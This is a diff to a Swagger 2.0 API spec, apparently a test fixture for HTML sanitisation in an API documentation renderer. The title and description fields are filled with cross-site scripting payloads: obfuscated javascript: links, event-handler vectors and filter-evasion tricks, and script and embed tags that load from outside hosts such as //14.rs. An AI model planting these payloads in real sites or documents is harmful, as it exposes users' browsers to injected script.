@@ -1,19 +1,31 @@
 swagger: "2.0"
 info:
-  title: <<scr<script>script>alert(4)</scr<script>ipt>"); alert(1); //
+  title: <<scr<script>script>alert(4)<</scr<script>/script>"); alert(1); //
     
   version: "1.0.0"
   description: >
-    <h1>H1</h1><h2>H2</h2><h3>H3</h3><h4>H4</h4><h5>H5</h5><h6>H6</h6>
-    <b>Bold</b><i>Italic</i><u>Underline</u><strike>Strike</strike>
-    <a href="http://me6.com/aem/xss2.svg">Click me</a>
-    <img src="x" onerror="alert('IMG XSS')">
-    <svg/onload=alert('SVG XSS')>
-    <iframe src="javascript:alert('Iframe XSS')"></iframe>
-    <video><source onerror="alert('Video XSS')"></video>
-    <details open ontoggle="alert('Details XSS')"><summary>Summary</summary></details>
-    <math><mtext><option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
-    <object data="javascript:alert('Object XSS')"></object>
+    <a href="https://evil.com" target="_blank" rel="noopener noreferrer">Click me</a>
+    <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+    <d3"<"/onclick="1>[confirm``]"<">z
+    <d3/onmouseenter=[2].find(confirm)>z
+    <details open ontoggle=confirm()>
+    <script y="><">/*<script* */prompt()</script
+    <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+    <a href="javascript%26colon;alert(1)">click
+    <a href=javas&#99;ript:alert(1)>click
+    <script/"<a"/src=data:=".<a,[8].some(confirm)>
+    <svg/x=">"/onload=confirm()//
+    <--`<img/src=` onerror=confirm``> --!>
+    <svg%0Aonload=%09((pro\u006dpt))()//
+    <sCript x>(((confirm)))``</scRipt x>
+    <svg </onload ="1> (_=prompt,_(1)) "">
+    <!--><script src=//14.rs>
+    <embed src=//14.rs>
+    <script x=">" src=//15.rs></script>
+    <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+    <iframe/src \/\/onload = prompt(1)
+    <x oncut=alert()>x
+    <svg onload=write()>
 
 host: "api.test.com"
 basePath: "/"
